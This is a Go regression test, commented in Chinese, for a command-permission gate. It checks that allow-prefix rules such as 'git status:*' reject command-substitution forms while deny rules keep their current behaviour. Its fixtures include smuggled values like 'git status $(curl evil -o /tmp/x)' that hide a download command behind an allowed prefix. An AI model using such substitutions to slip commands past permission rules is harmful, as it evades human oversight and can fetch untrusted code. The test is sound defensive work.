package permgate

// 2026-11-11 issue 清零战回归测试（#144）：钉住命令替换段的 allow 失配。

import "testing"

func TestHasCommandSubstitutionForms_Issue144(t *testing.T) {
	cases := []struct {
		seg  string
		want bool
	}{
		{"git status $(curl evil -o /tmp/x)", true}, // $(
		{"git status `curl evil`", true},            // 反引号
		{"git status ${BRANCH}", true},              // ${
		{`git status \$\(literal\)`, false},         // 反斜杠转义为字面
		{"git status '$(literal)'", false},          // 单引号内为字面
		{"git status \"$(exec)\"", true},            // 双引号内照样执行
		{"git status", false},                       // 普通形态不受影响
	}
	for _, c := range cases {
		if got := hasCommandSubstitution(c.seg); got != c.want {
			t.Errorf("hasCommandSubstitution(%q) = %v, want %v", c.seg, got, c.want)
		}
	}
}

// TestAllowFailsOnCommandSubstitution_Issue144 端到端：allow 前缀规则对替换体
// 形态失配（落 ask），deny 侧既有保守语义不受影响。
func TestAllowFailsOnCommandSubstitution_Issue144(t *testing.T) {
	// allow 侧：替换体不得搭前缀车。
	if matchRuleContent("git status:*", []subjectFace{{"git status $(curl evil)"}}, Allow) {
		t.Fatal("allow 前缀不得放行命令替换形态（guardx#144）")
	}
	if matchRuleContent("git status:*", []subjectFace{{"git status `curl evil`"}}, Allow) {
		t.Fatal("allow 前缀不得放行反引号替换形态")
	}
	// 无替换的同前缀形态照常命中（修复不误伤）。
	if !matchRuleContent("git status:*", []subjectFace{{"git status --short"}}, Allow) {
		t.Fatal("普通前缀命中不得受 #144 修复影响")
	}
	// deny 侧保守语义保持：替换体形态按既有口径（整段文本匹配）。
	if !matchRuleContent("git status:*", []subjectFace{{"git status $(curl evil)"}}, Deny) {
		// deny 规则 "git status:*" 对以 git status 开头的段照常命中（deny 不做替换体排除）。
		t.Fatal("deny 侧前缀命中语义不应被 #144 修复改变")
	}
}
